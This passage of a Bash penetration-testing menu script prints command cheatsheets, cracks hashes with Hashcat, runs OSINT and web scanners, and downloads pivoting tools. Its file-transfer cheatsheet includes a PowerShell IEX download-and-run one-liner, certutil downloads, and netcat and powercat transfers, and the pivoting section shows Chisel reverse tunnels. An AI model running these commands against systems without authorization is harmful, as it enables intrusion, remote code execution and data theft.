		        clear
            fi
			clear        
        fi
    done
}

# Function to show cheatsheets
show_cheatsheets() {
    while true; do
        show_info_panel
        echo -e "${BLUE}[+] Select a Cheatsheet:${NC}"
        echo -e "1) Linux commands"
        echo -e "2) Windows commands"
        echo -e "3) Pivoting"
        echo -e "4) File transfers"
        echo -e "5) Back to Main Menu"
        read -e -p "Option: " cheatsheet_option

        case $cheatsheet_option in
            1)
		        clear
                echo -e "${VIOLET}\n\n\n===================================================="
                echo -e "================== ${YELLOW}Linux Commands ${VIOLET}=================="
                echo -e "====================================================${NC}"
                echo
                echo -e "${YELLOW}ls: List files and directories${NC}"
                echo "example: ls -la"
                echo
                echo -e "${YELLOW}cd: Change the current directory${NC}"
                echo "example: cd /home/user"
                echo
                echo -e "${YELLOW}pwd: Shows the current directory${NC}"
                echo "example: pwd"
                echo
                echo -e "${YELLOW}cp: Copy files or directories${NC}"
                echo "example: cp source.txt destination.txt"
                echo
                echo -e "${YELLOW}mv: Move or rename files or directories${NC}"
                echo "example: mv oldname.txt newname.txt"
                echo
                echo -e "${YELLOW}rm: Delete files or directories${NC}"
                echo "example: rm file.txt"
                echo
                echo -e "${YELLOW}mkdir: Create a new directory${NC}"
                echo "example: mkdir new_directory"
                echo
                echo -e "${YELLOW}rmdir: Delete an empty directory${NC}"
                echo "example: rmdir empty_directory"
                echo
                echo -e "${YELLOW}touch: Create an empty file or update a file's timestamp${NC}"
                echo "example: touch newfile.txt"
                echo
                echo -e "${YELLOW}cat: Show the content of a file${NC}"
                echo "example: cat file.txt"
                echo
                echo -e "${YELLOW}nano: Text editor in terminal${NC}"
                echo "example: nano file.txt"
                echo
                echo -e "${YELLOW}chmod: Change the permissions of a file or directory${NC}"
                echo "example: chmod 755 script.sh"
                echo
                echo -e "${YELLOW}chown: Change the owner of a file or directory${NC}"
                echo "example: chown user:group file.txt"
                echo
                echo -e "${YELLOW}grep: Search text within files${NC}"
                echo "example: grep 'search_term' file.txt"
                echo
                echo -e "${YELLOW}find: Searches files and directories in the file system${NC}"
                echo "example: find /path -name filename"
                echo
                echo -e "${YELLOW}awk: Process and analyze text${NC}"
                echo "example: awk '{print \$1}' file.txt"
                echo
                echo -e "${YELLOW}sed: Flow text editor${NC}"
                echo "example: sed 's/old/new/g' file.txt"
                echo
                echo -e "${YELLOW}tar: Archive files and directories${NC}"
                echo "example: tar -cvf archive.tar directory"
                echo
                echo -e "${YELLOW}gzip: Compress files${NC}"
                echo "example: gzip file.txt"
                echo
                echo -e "${YELLOW}gunzip: Unzip files${NC}"
                echo "example: gunzip file.txt.gz"
                echo
                echo -e "${YELLOW}rsync: Synchronize files and directories${NC}"
                echo "example: rsync -avz source/ destination/"
                echo
                echo -e "${YELLOW}iptables: Configure firewall rules${NC}"
                echo "example: iptables -A INPUT -p tcp --dport 22 -j ACCEPT"
                echo
                echo -e "${YELLOW}netstat: Shows network connections, routing tables, and interface statistics${NC}"
                echo "example: netstat -tuln"
                echo
                echo -e "${YELLOW}top: Shows running processes and system usage in real time${NC}"
                echo "example: top"
                echo
                echo -e "${YELLOW}htop: Improved version of top${NC}"
                echo "example: htop"
                echo
                read -e -p "Press enter to go back..."
                break
                ;;
            2)
		        clear
                echo -e "${VIOLET}\n\n\n======================================================"
                echo -e "================== ${YELLOW}Windows Commands ${VIOLET}=================="
                echo -e "======================================================${NC}"
                echo
                echo -e "${YELLOW}dir: List files and directories${NC}"
                echo "example: dir"
                echo
                echo -e "${YELLOW}cd: Change the current directory${NC}"
                echo "example: cd C:\Users\User"
                echo
                echo -e "${YELLOW}cls: Clean the terminal screen${NC}"
                echo "example: cls"
                echo
                echo -e "${YELLOW}copy: Copy files${NC}"
                echo "example: copy source.txt destination.txt"
                echo
                echo -e "${YELLOW}move: Move or rename files${NC}"
                echo "example: move oldname.txt newname.txt"
                echo
                echo -e "${YELLOW}del: Delete files${NC}"
                echo "example: del file.txt"
                echo
                echo -e "${YELLOW}mkdir: Create a new directory${NC}"
                echo "example: mkdir new_directory"
                echo
                echo -e "${YELLOW}rmdir: Delete a directory${NC}"
                echo "example: rmdir empty_directory"
                echo
                echo -e "${YELLOW}type: Show the content of a file${NC}"
                echo "example: type file.txt"
                echo
                echo -e "${YELLOW}notepad: Open Notepad${NC}"
                echo "example: notepad file.txt"
                echo
                echo -e "${YELLOW}attrib: Show or change file attributes${NC}"
                echo "example: attrib +r file.txt"
                echo
                echo -e "${YELLOW}icacls: Display or change access control lists (ACLs) for files and directories${NC}"
                echo "example: icacls file.txt /grant User:F"
                echo
                echo -e "${YELLOW}findstr: Search text within files${NC}"
                echo "example: findstr 'search_term' file.txt"
                echo
                echo -e "${YELLOW}tasklist: Shows a list of running processes${NC}"
                echo "example: tasklist"
                echo
                echo -e "${YELLOW}taskkill: Terminate one or more processes${NC}"
                echo "example: taskkill /PID 1234 /F"
                echo
                echo -e "${YELLOW}powershell: Start a Windows PowerShell session${NC}"
                echo "example: powershell"
                echo
                echo -e "${YELLOW}schtasks: Schedule commands and programs to run on a computer${NC}"
                echo "example: schtasks /create /sc daily /tn Backup /tr C:\backup.bat /st 23:00"
                echo
                echo -e "${YELLOW}netstat: Shows network connections, routing tables, and interface statistics${NC}"
                echo "example: netstat -an"
                echo
                echo -e "${YELLOW}ipconfig: Shows the computer's network settings${NC}"
                echo "example: ipconfig /all"
                echo
                echo -e "${YELLOW}reg: Check or change the Windows Registry${NC}"
                echo "example: reg query HKLM\Software"
                echo
                echo -e "${YELLOW}sc: Control Windows services${NC}"
                echo "example: sc stop ServiceName"
                echo
                echo -e "${YELLOW}wmic: Windows Management Instrumentation interface${NC}"
                echo "example: wmic process list"
                echo
                read -e -p "Press enter to go back..."
                break
                ;;
            3)
		        clear
                echo -e "${VIOLET}\n\n\n=============================================="
                echo -e "================== ${YELLOW}Pivoting ${VIOLET}=================="
                echo -e "==============================================${NC}"
                echo
                echo -e "${YELLOW}Chisel Server:${NC}"
                echo "We have to have chisel decompressed: gunzip chisel_1.X.X_linux_arm64.gz"
                echo "Give execution permissions: chmod +x chisel"
                echo -e "${BLUE}example para ponernos a escucha en el puerto 33: ./chisel server --reverse -p 33${NC}"
                echo "Now on the client computer we will have to have chisel and use it in client mode"
                echo -e "${BLUE}example to get into client mode tunneling all ports: ./chisel client ${VIOLET}SERVER-IP${BLUE}:${VIOLET}1234${BLUE} R:socks"
                echo -e "${BLUE}example to get into client mode tunneling 1 port: ./chisel client ${VIOLET}SERVER-IP${BLUE}:1234 R:80:${VIOLET}LOCAL-IP${BLUE}:80"
                echo -e "${RED}       *If we run the client on Windows we will have to use chisel.exe (followed by the command)${NC}"
                echo
                echo -e "${YELLOW}Socat:${NC}"
                echo -e "${BLUE}Run socat on the intermediate machine: ./socat tcp-l:1080,fork,reuseaddr tcp:${VIOLET}TARGET-IP${BLUE}:111"
                echo "This means that all the traffic that the intermediate machine receives through port 1080 will be forwarded to our Kali machine through port 111."
                echo -e "${RED}       *If we run it on Windows we will have to use socat.exe (followed by the command)${NC}"
                echo
                echo -e "${YELLOW}Netsh:${NC}"
                echo -e "${BLUE}example: netsh interface portproxy add v4tov4 listenport=${VIOLET}LOCAL-PORT${BLUE} listenaddress=${VIOLET}LOCAL-IP${BLUE} connectport=${VIOLET}REMOTE-PORT${BLUE} connectaddress=${VIOLET}TARGET-IP${NC}"
                echo
                read -e -p "Type [1] to go the Downloads Page  |  Press [ENTER] to go back: " enterx
                if [ "$enterx" = "1" ]; then
                    clear
                    download_tools
                else
                    clear
                    break
                fi
                ;;
            4)
		        clear
                echo -e "${VIOLET}\n\n\n===================================================="
                echo -e "================== ${YELLOW}File Transfers ${VIOLET}=================="
                echo -e "====================================================${NC}"
                echo
				echo -e "${GREEN}LINUX:${NC}"
                echo
    			echo -e "${YELLOW}curl:${NC}"
    			echo "example: curl -O http://example.com/file"
    			echo
    			echo -e "${YELLOW}wget:${NC}"
    			echo "example: wget http://example.com/file"
    			echo
    			echo -e "${YELLOW}socat:${NC}"
    			echo "example: socat TCP-LISTEN:1234,fork file:file_to_send"
    			echo
    			echo -e "${YELLOW}netcat:${NC}"
    			echo "example: nc -l -p 1234 > file_received"
    			echo
    			echo -e "${YELLOW}scp:${NC}"
    			echo "example: scp file_to_send user@remote_host:/path/to/destination"
    			echo
    			echo -e "${YELLOW}rsync:${NC}"
    			echo "example: rsync -avz file_to_send user@remote_host:/path/to/destination"
    			echo
                echo -e "${VIOLET} ----------------------------------------------------------------------"
                echo
    			echo -e "${GREEN}WINDOWS:${NC}"
                echo
    			echo -e "${YELLOW}PowerShell (Download a file):${NC}"
    			echo "example: powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://example.com/file','C:\\path\\to\\save\\file')\""
    			echo
    			echo -e "${YELLOW}certutil:${NC}"
    			echo "example: certutil.exe -urlcache -f http://example.com/file C:\\path\\to\\save\\file"
    			echo
    			echo -e "${YELLOW}socat:${NC}"
    			echo "example: socat TCP4:remote_host:1234 file:file_received,create"
    			echo
    			echo -e "${YELLOW}netcat:${NC}"
    			echo "example: nc.exe -nlvp 4444 > incoming.exe"
    			echo
    			echo -e "${YELLOW}PowerShell (Remote script execution):${NC}"
    			echo "example: powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/script.ps1')"
    			echo
    			echo -e "${YELLOW}FTP:${NC}"
    			echo "example: ftp -s:script.txt"
    			echo "Nota: 'script.txt' contiene comandos FTP como 'open', 'user', 'get', etc."
    			echo
    			echo -e "${YELLOW}Powercat:${NC}"
   				echo "example: powercat -c remote_host -p 443 -i C:\\path\\to\\file"
    			echo
    			echo -e "${YELLOW}Download wget with PowerShell:${NC}"
    			echo "example: powershell -command \"Invoke-WebRequest -Uri 'https://eternallybored.org/misc/wget/current/wget.exe' -OutFile 'C:\\path\\to\\save\\wget.exe'\""
    			echo
                read -e -p "Press enter to go back..."
                break
    			;;
            5)
                clear
                break
                ;;
            *)
                echo -e "${RED}[-] Invalid option.${NC}"
                ;;
        esac
    done
}

# Function to detect hash type
detect_hash_type() {
    hash=$1
    hash_length=${#hash}
    hashid_output=$(hashid "$hash")

    if [[ "$hash_length" -eq 32 && "$hash" =~ ^[A-F0-9]{32}$ ]]; then
        hash_type="NTLM"
    else
        case $hash_length in
            32)
                hash_type="MD5"
                ;;
            16)
                hash_type="CRC16"
                ;;
            8)
                hash_type="Adler32"
                ;;
            40)
                hash_type="SHA1"
                ;;
            64)
                hash_type="SHA256"
                ;;
            128)
                hash_type="SHA512"
                ;;
            48)
                hash_type="SHA224"
                ;;
            96)
                hash_type="SHA384"
                ;;
            *)
                hash_type=$(echo "$hashid_output" | grep -Eo 'MD2|MD4|MD5|SHA1|SHA224|SHA256|SHA384|SHA512|CRC16|Adler32' | head -n 1)
                ;;
        esac
    fi

    echo -e "${GREEN}[+] Detected hash type: ${hash_type}${NC}"
    echo $hash_type
}

# Function to check and update the log file
check_and_update_log() {
    log_file="${BASE_DIR}/hashes_cracked.log"
    hash=$1
    password=$2

    if [ ! -f "$log_file" ]; then
        touch "$log_file"
    fi

    if [ -n "$password" ]; then
        echo "$hash:$password" >> "$log_file"
    fi

    grep "^$hash:" "$log_file" | awk -F':' '{print $3}'
}

# Function to crack a hash using Hashcat
crack_with_hashcat() {
    show_info_panel
    last_output=""
    read -e -p "Enter the hash: " hash
    hash_type=$(detect_hash_type "$hash")
    if [ $? -ne 0 ]; then
        return 1
    fi

    # Check if the hash is already cracked
    existing_password=$(check_and_update_log "$hash")
    if [ -n "$existing_password" ]; then
        clear
        echo -e "${GREEN}[+] Hash already cracked:${NC}"
        echo -e "${GREEN}Hash: ${hash}${NC}"
        echo -e "${GREEN}Password: ${existing_password}${NC}"
        return 0
    fi

    echo -e "${BLUE}[+] Do you want to use the default dictionary (/usr/share/wordlists/rockyou.txt)? (y/n):${NC}"
    read -e -p "Option: " dict_option2
    if [ "$dict_option2" == "n" ]; then
        echo -e "${BLUE}[+] Enter the dictionary path:${NC}"
        read -e -p "Dictionary: " custom_dict2
        dict_option2="$custom_dict2"
    else
        dict_option2="/usr/share/wordlists/rockyou.txt"
    fi
    read -e -p "Enter the file name to save the results: " output_file

    declare -A hash_modes=(
        ["NTLM"]="1000"
        ["MD2"]="10"
        ["MD4"]="900"
        ["MD5"]="0"
        ["MD6-128"]="3710"
        ["MD6-256"]="7200"
        ["MD6-512"]="9000"
        ["RipeMD-128"]="6000"
        ["RipeMD-160"]="20000"
        ["RipeMD-256"]="10000"
        ["RipeMD-320"]="20000"
        ["SHA1"]="100"
        ["SHA3-224"]="17300"
        ["SHA3-256"]="17400"
        ["SHA3-384"]="17500"
        ["SHA3-512"]="17600"
        ["SHA-224"]="1300"
        ["SHA-256"]="1400"
        ["SHA-384"]="10800"
        ["SHA-512"]="1700"
        ["CRC16"]="11500"
        ["CRC32"]="11500"
        ["Adler32"]="2000"
        ["Whirlpool"]="6100"
    )
    hash_detected=false

    for hash_name in "${!hash_modes[@]}"; do
        mode=${hash_modes[$hash_name]}
        clear
        echo -e "${VIOLET}\n\n\n=========================================================================="
        echo -e "================== ${YELLOW}Testing mode Hashcat: $hash_name (${mode}) ${VIOLET}=================="
        echo -e "==========================================================================${NC}"
        echo "$hash" > hash.txt
        hashcat -m $mode -a 0 hash.txt $dict_option2 -o "$BASE_DIR/loot/$output_file"
        result=$(cat "$BASE_DIR/loot/$output_file")
        if [[ -n "$result" ]]; then
            hash_detected=true
            echo -e "${GREEN}>>>>>>>>>>>>>>>>>>>>>>>>>>>> ${RED}PASSWORD ${GREEN}<<<<<<<<<<<<<<<<<<<<<<<<<<<${NC}"
            echo -e "${YELLOW}[+] Decrypted hash: ${result}${NC}"
            mv "$BASE_DIR/loot/$output_file" "$BASE_DIR/loot/cracked_$output_file.txt"
            check_and_update_log "$hash" "$result"
            echo -e "${GREEN}>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> ${RED}o ${GREEN}<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<${NC}"
            break
        fi
    done

    if ! $hash_detected; then
        echo -e "${RED}[-] Could not decrypt hash with tested types.${NC}"
    fi
}

# Function to select and execute hash cracking tool
hash_crack_menu() {
    while true; do
        show_info_panel
        echo -e "${BLUE}[+] Select a Hash Crack Option:${NC}"
        echo -e "1) Detect hash type"
        echo -e "2) Decrypt hash with Hashcat"
        echo -e "3) Back to Main Menu"
        read -e -p "Option: " hash_crack_option

        case $hash_crack_option in
            1)
                detect_hash_type
                ;;
            2)
                crack_with_hashcat
                ;;
            3)
                clear
                break
                ;;
            *)
                echo -e "${RED}[-] Invalid option.${NC}"
                ;;
        esac
    done
}

# Function for OSINT Tools submenu
osint_tools_menu() {
    while true; do
        show_info_panel
        echo -e "${BLUE}[+] Select an OSINT Tool Option:${NC}"
        echo -e "1) theHarvester"
        echo -e "2) Spiderfoot"
        echo -e "3) FinalRecon scan"
        echo -e "4) Nuclei scan"
        echo -e "5) Back to Main Menu"
        read -e -p "Option: " osint_tools_option

        clear
        case $osint_tools_option in
            1)
                osint_theharvester
                ;;
            2)
                osint_spiderfoot
                ;;
            3)
                osint_finalrecon
                ;;
            4)
                osint_nuclei
                ;;
            5)
                clear
                break
                ;;
            *)
                echo -e "${RED}[-] Invalid option.${NC}"
                ;;
        esac
    done
}

# Function to perform OSINT with theHarvester
osint_theharvester() {
    show_info_panel
    read -e -p "Enter the target domain: " domain
    echo ""
    echo -e "${YELLOW}Available sources:${NC} anubis, baidu, bevigil, binaryedge, bing, bingapi, bufferoverun, brave, censys, certspotter, criminalip, crtsh, dnsdumpster, duckduckgo, fullhunt, github-code, hackertarget, hunter, hunterhow, intelx, netlas, onyphe, otx, pentesttools, projectdiscovery, rapiddns, rocketreach, securityTrails, sitedossier, subdomaincenter, subdomainfinderc99, threatminer, tomba, urlscan, virustotal, yahoo, zoomeye${NC}: " source
    echo ""
    read -e -p "Enter the source (comma-separated for multiple): " source
    clear
    echo -e "${GREEN}[+] Running theHarvester against $domain with source $source${NC}"
    theHarvester -d $domain -b $source -f "$BASE_DIR/osint/theharvester_${source}_${hora}.html"
    echo -e "${GREEN}[+] theHarvester report saved in ${BASE_DIR}/osint/theharvester_${source}_${hora}.html${NC}"
}

# Function to perform OSINT with Spiderfoot
osint_spiderfoot() {
    show_info_panel
    read -e -p "Enter the target domain: " domain
    echo -e "${BLUE}[+] Select a Spiderfoot module to run:${NC}"
    echo -e "1) sfp_abstractapi            - Look up domain, phone and IP address information from AbstractAPI."
    echo -e "2) sfp_abusech                - Check if a host/domain, IP address or netblock is malicious according to Abuse.ch."
    echo -e "3) sfp_abuseipdb              - Check if an IP address is malicious according to AbuseIPDB.com blacklist."
    echo -e "4) sfp_accounts               - Look for possible associated accounts on nearly 200 websites."
    echo -e "5) sfp_adblock                - Check if linked pages would be blocked by AdBlock Plus."
    echo -e "6) sfp_adguard_dns            - Check if a host would be blocked by AdGuard DNS."
    echo -e "7) sfp_ahmia                  - Search Tor 'Ahmia' search engine for mentions of the target."
    echo -e "8) sfp_alienvault             - Obtain information from AlienVault Open Threat Exchange (OTX)."
    echo -e "9) sfp_alienvaultiprep        - Check if an IP or netblock is malicious according to the AlienVault IP Reputation database."
    echo -e "10) sfp_archiveorg            - Identifies historic versions of interesting files/pages from the Wayback Machine."
    echo -e "11) sfp_arin                  - Queries ARIN registry for contact information."
    echo -e "12) sfp_bgpview               - Obtain network information from BGPView API."
    echo -e "13) sfp_binaryedge            - Obtain information from BinaryEdge.io Internet scanning systems."
    echo -e "14) sfp_bingsearch            - Obtain information from Bing to identify sub-domains and links."
    echo -e "15) sfp_bitcoin               - Identify bitcoin addresses in scraped webpages."
    echo -e "16) sfp_bitcoinabuse          - Check Bitcoin addresses against the bitcoinabuse.com database of suspect/malicious addresses."
    echo -e "17) sfp_blockchain            - Queries blockchain.info to find the balance of identified bitcoin wallet addresses."
    echo -e "18) sfp_builtwith             - Query BuiltWith.com's Domain API for web technology stack information."
    echo -e "19) sfp_censys                - Obtain host information from Censys.io."
    echo -e "20) sfp_certspotter           - Gather information about SSL certificates from SSLMate CertSpotter API."
    echo -e "21) sfp_crt                   - Gather hostnames from historical certificates in crt.sh."
    echo -e "22) sfp_dnsdumpster           - Passive subdomain enumeration using HackerTarget's DNSDumpster."
    echo -e "23) sfp_dnsgrep               - Obtain Passive DNS information from Rapid7 Sonar Project using DNSGrep API."
    echo -e "24) sfp_dnsresolve            - Resolves hosts and IP addresses identified, also extracted from raw content."
    echo -e "25) sfp_dronebl               - Query the DroneBL database for open relays, open proxies, vulnerable servers, etc."
    echo -e "26) sfp_duckduckgo            - Query DuckDuckGo's API for descriptive information about your target."
    echo -e "27) sfp_email                 - Identify e-mail addresses in any obtained data."
    echo -e "28) sfp_haveibeenpwned        - Check HaveIBeenPwned.com for hacked e-mail addresses identified in breaches."
    echo -e "29) sfp_hunter                - Check for e-mail addresses and names on hunter.io."
    echo -e "30) sfp_virustotal            - Obtain information from VirusTotal about identified IP addresses."
    echo -e "31) Enter other module manually"

    read -e -p "Option: " spiderfoot_option
    clear
    case $spiderfoot_option in
        1) module="sfp_abstractapi" ;;
        2) module="sfp_abusech" ;;
        3) module="sfp_abuseipdb" ;;
        4) module="sfp_accounts" ;;
        5) module="sfp_adblock" ;;
        6) module="sfp_adguard_dns" ;;
        7) module="sfp_ahmia" ;;
        8) module="sfp_alienvault" ;;
        9) module="sfp_alienvaultiprep" ;;
        10) module="sfp_archiveorg" ;;
        11) module="sfp_arin" ;;
        12) module="sfp_bgpview" ;;
        13) module="sfp_binaryedge" ;;
        14) module="sfp_bingsearch" ;;
        15) module="sfp_bitcoin" ;;
        16) module="sfp_bitcoinabuse" ;;
        17) module="sfp_blockchain" ;;
        18) module="sfp_builtwith" ;;
        19) module="sfp_censys" ;;
        20) module="sfp_certspotter" ;;
        21) module="sfp_crt" ;;
        22) module="sfp_dnsdumpster" ;;
        23) module="sfp_dnsgrep" ;;
        24) module="sfp_dnsresolve" ;;
        25) module="sfp_dronebl" ;;
        26) module="sfp_duckduckgo" ;;
        27) module="sfp_email" ;;
        28) module="sfp_haveibeenpwned" ;;
        29) module="sfp_hunter" ;;
        30) module="sfp_virustotal" ;;
        31)
            read -e -p "Enter other module name: " module
            ;;
        *)
            echo -e "${RED}[-] Invalid option.${NC}"
            return 1
            ;;
    esac

    echo -e "${BLUE}[+] Running Spiderfoot module ${module} on ${domain}${NC}"
    spiderfoot -s $domain -m $module -F html > "$BASE_DIR/osint/spiderfoot_${hora}.html"
    last_output=$(cat "$BASE_DIR/osint/spiderfoot_${hora}.html")
    cat "$BASE_DIR/osint/spiderfoot_${hora}.html"
    echo -e "${GREEN}[+] Spiderfoot report saved in ${BASE_DIR}/osint/spiderfoot_${hora}.html${NC}"
}

# Function to perform OSINT with FinalRecon
osint_finalrecon() {
show_info_panel
    read -e -p "Enter the target domain or IP: " target
    if [[ "$target" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        read -e -p "Is the IP using HTTPS? (y/n): " is_https
        if [ "$is_https" == "y" ]; then
            target="https://$target"
        else
            target="http://$target"
        fi
    fi

    echo -e "${BLUE}[+] Select a scan type:${NC}"
    echo -e "1) Full Recon - Complete information gathering"
    echo -e "2) Headers - Header Information"
    echo -e "3) SSL Info - SSL Certificate Information"
    echo -e "4) Whois - Whois Lookup"
    echo -e "5) Crawl - Crawl Target"
    echo -e "6) DNS - DNS Enumeration"
    echo -e "7) Sub-Domain - Sub-Domain Enumeration"
    echo -e "8) Directory - Directory Search"
    echo -e "9) Wayback - Wayback URLs"
    echo -e "10) Port Scan - Fast Port Scan"
    read -e -p "Option: " scan_option
    clear

    case $scan_option in
        1) scan_type="full" ;;
        2) scan_type="headers" ;;
        3) scan_type="sslinfo" ;;
        4) scan_type="whois" ;;
        5) scan_type="crawl" ;;
        6) scan_type="dns" ;;
        7) scan_type="sub" ;;
        8) scan_type="dir" ;;
        9) scan_type="wayback" ;;
        10) scan_type="ps" ;;
        *) echo -e "${RED}[-] Invalid option.${NC}"; return ;;
    esac

    hora=$(date +"%m-%d-%H:%M")
    output_file="$BASE_DIR/enum/finalrecon_${scan_type}_$hora.txt"
    
    echo -e "${VIOLET}\n\n\n==================================================================="
    echo -e "================== ${YELLOW}FinalRecon Scan Type: $scan_type ${VIOLET}=================="
    echo -e "===================================================================${NC}"
    
    finalrecon --$scan_type $target > "$output_file"
    
    last_output=$(cat "$output_file")
    cat "$output_file"
    echo -e "${GREEN}[+] FinalRecon report saved in $output_file${NC}"
}

# Function for Web Tools submenu
web_tools_menu() {
    while true; do
        show_info_panel
        echo -e "${BLUE}[+] Select a Web Tools Option:${NC}"
        echo -e "1) WhatWeb scan"
        echo -e "2) Nikto scan"
        echo -e "3) Gobuster Scan"
        echo -e "4) Subdomain Scan"
        echo -e "5) Back to Main Menu"
        read -e -p "Option: " web_tools_option

        clear
        case $web_tools_option in
            1)
                show_info_panel
                if [ -z "$IP" ]; then
                    echo -e "${RED}[-] No IP configured.${NC}"
                else
                    read -e -p "Enter the port to scan with WhatWeb: " whatweb_port
                    read -e -p "Is it an HTTPS port? (y/n): " is_https
                    clear
                    if [ "$is_https" == "y" ]; then
                        echo -e "${GREEN}[+] Performing whatweb scan on https://${IP}:${whatweb_port}${NC}"
                        whatweb https://${IP}:${whatweb_port} > "$ENUM_DIR/whatweb_$whatweb_port.txt"
                    else
                        echo -e "${GREEN}[+] Performing whatweb scan on http://${IP}:${whatweb_port}${NC}"
                        whatweb http://${IP}:${whatweb_port} > "$ENUM_DIR/whatweb_$whatweb_port.txt"
                    fi
                    last_output=$(cat "$ENUM_DIR/whatweb_$whatweb_port.txt")
                    echo -e "${GREEN}[+] WhatWeb Report saved in ${ENUM_DIR}/whatweb_${whatweb_port}.txt${NC}"
                    cat "$ENUM_DIR/whatweb_$whatweb_port.txt"
                fi
                ;;
            2)
                show_info_panel
                if [ -z "$IP" ]; then
                    echo -e "${RED}[-] No IP configured.${NC}"
                else
                    read -e -p "Enter the port to scan with Nikto: " nikto_port
                    clear
                    echo -e "${GREEN}[+] Performing Nikto scan on ${IP}:${nikto_port}${NC}"
                    nikto -h $IP:$nikto_port | tee "$ENUM_DIR/nikto_$nikto_port.txt"
                    last_output=$(cat "$ENUM_DIR/nikto_$nikto_port.txt")
                    echo -e "${GREEN}[+] Nikto Report saved in ${ENUM_DIR}/nikto_${nikto_port}.txt${NC}"
                fi
                ;;
            3)
                show_info_panel
                if [ -z "$IP" ]; then
                    echo -e "${RED}[-] No IP configured.${NC}"
                else
                    read -e -p "Enter the URL/IP to scan with Gobuster: " gobuster_target
                    echo -e "${BLUE}[+] ¿Do you want to fuzz with file extensions? (y/n):${NC}"
                    read -e -p "Option: " fuzz_option
                    if [ "$fuzz_option" == "y" ]; then
                        echo -e "${BLUE}[+] Enter the extensions separated by commas (example: php,html,txt):${NC}"
                        read -e -p "Extensions: " extensions
                        ext_option="-x $extensions"
                    else
                        ext_option=""
                    fi
                    echo -e "${BLUE}[+] ¿Do you want to use the default dictionary (/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt)? (y/n):${NC}"
                    read -e -p "Option: " dict_option
                    if [ "$dict_option" == "n" ]; then
                        echo -e "${BLUE}[+] Enter the path to the custom dictionary:${NC}"
                        read -e -p "Dictionary: " custom_dict
                        dict_option="-w $custom_dict"
                    else
                        dict_option="-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt"
                    fi
                    clear
                    echo -e "${GREEN}[+] Performing Gobuster scan on ${gobuster_target}${NC}"
                    gobuster dir -u $gobuster_target $dict_option $ext_option -o "$ENUM_DIR/gobuster.txt"
                    last_output=$(cat "$ENUM_DIR/gobuster.txt")
                    echo -e "${GREEN}[+] Gobuster Report saved in ${ENUM_DIR}/gobuster.txt${NC}"
                fi
                ;;
            4)
                clear
                show_info_panel
                subdomain_enumeration
                ;;
            5)
                clear
                break
                ;;
            *)
                echo -e "${RED}[-] Invalid option.${NC}"
                ;;
        esac
    done
}

subdomain_enumeration() {
    read -e -p "Enter the domain to enumerate subdomains: " domain
    echo -e "${YELLOW}[+] Enumerating subdomains for $domain...${NC}"
    sublist3r -d $domain
}

# Function to download tools
download_tools() {
    show_info_panel
    echo -e "${BLUE}Select the tool to download:${NC}"
    echo -e "1) Socat"
    echo -e "2) Chisel"
    echo -e "3) Ligolo"
    echo -e "4) WinPEAS"
    echo -e "5) LinPEAS"
    echo -e "6) Back to Main Menu"
    read -e -p "Enter your choice: " tool_choice
    clear

    case $tool_choice in
        1)
            echo -e "${BLUE}Select Socat version to download:${NC}"
            echo -e "1) Linux latest"
            echo -e "2) Windows V1.7.3"
            echo -e "3) Back to Main Menu"
            read -e -p "Enter your choice: " socat_version
            case $socat_version in
                1) 
                    wget -P "$BASE_DIR/tools" "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"
                    clear
                    echo -e "${GREEN}[+] Socat (Linux - Latest) downloaded and saved as $BASE_DIR/tools/socat${NC}"
                    ;;
                2) 
                    wget -P "$BASE_DIR/tools" "https://github.com/tech128/socat-1.7.3.0-windows/archive/refs/heads/master.zip"
                    clear
                    echo -e "${GREEN}[+] Socat (Windows - V1.7.3) downloaded and saved as $BASE_DIR/tools/master.zip${NC}"
                    ;;
                3)
                    clear
                    return
                    ;;
                *)
                    echo -e "${RED}[-] Invalid option.${NC}"
                    ;;
            esac
            ;;
        2)
            echo -e "${BLUE}Select Chisel version to download:${NC}"
            echo -e "1) Linux V1.9.1"
            echo -e "2) Linux V1.7.3"
            echo -e "3) Windows V1.9.1"
            echo -e "4) Windows V1.7.3"
            echo -e "5) Back to Main Menu"
            read -e -p "Enter your choice: " chisel_version
            case $chisel_version in
                1) 
                    wget -P "$BASE_DIR/tools" "https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz"
                    clear
                    echo -e "${GREEN}[+] Chisel (Linux - V1.9.1) downloaded and saved as $BASE_DIR/tools/chisel_1.9.1_linux_amd64.gz${NC}"
                    ;;
                2) 
                    wget -P "$BASE_DIR/tools" "https://github.com/jpillora/chisel/releases/download/v1.7.3/chisel_1.7.3_linux_amd64.gz"
                    clear
                    echo -e "${GREEN}[+] Chisel (Linux - V1.7.3) downloaded and saved as $BASE_DIR/tools/chisel_1.7.3_linux_amd64.gz${NC}"
                    ;;
                3) 
                    wget -P "$BASE_DIR/tools" "https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_386.gz"
                    clear
                    echo -e "${GREEN}[+] Chisel (Windows - V1.9.1) downloaded and saved as $BASE_DIR/tools/chisel_1.9.1_windows_386.gz${NC}"
                    ;;
                4) 
                    wget -P "$BASE_DIR/tools" "https://github.com/jpillora/chisel/releases/download/v1.7.3/chisel_1.7.3_windows_386.gz"
                    clear
                    echo -e "${GREEN}[+] Chisel (Windows - V1.7.3) downloaded and saved as $BASE_DIR/tools/chisel_1.7.3_windows_386.gz${NC}"
                    ;;
                5)
                    clear
                    return
                    ;;
                *) 
                    echo "Invalid option"
                    ;;
            esac
            ;;
        3)
            echo -e "${BLUE}Select Ligolo version to download:${NC}"
            echo -e "1) Ng-Proxy (Server)"
            echo -e "2) Ng-Agent (Client)"
            echo -e "3) Back to Main Menu"
            read -e -p "Enter your choice: " ligolo_choice
            case $ligolo_choice in
                1)
                    echo -e "${BLUE}Select Ligolo Ng-Proxy version to download:${NC}"
                    echo -e "1) Ligolo Proxy V0.6.1 Linux"
                    echo -e "2) Ligolo Proxy V0.5.2 Linux"
                    echo -e "3) Ligolo Proxy V0.6.1 Windows"
                    echo -e "4) Ligolo Proxy V0.5.2 Windows"
                    echo -e "5) Back to Main Menu"
                    read -e -p "Enter your choice: " ligolo_server_version
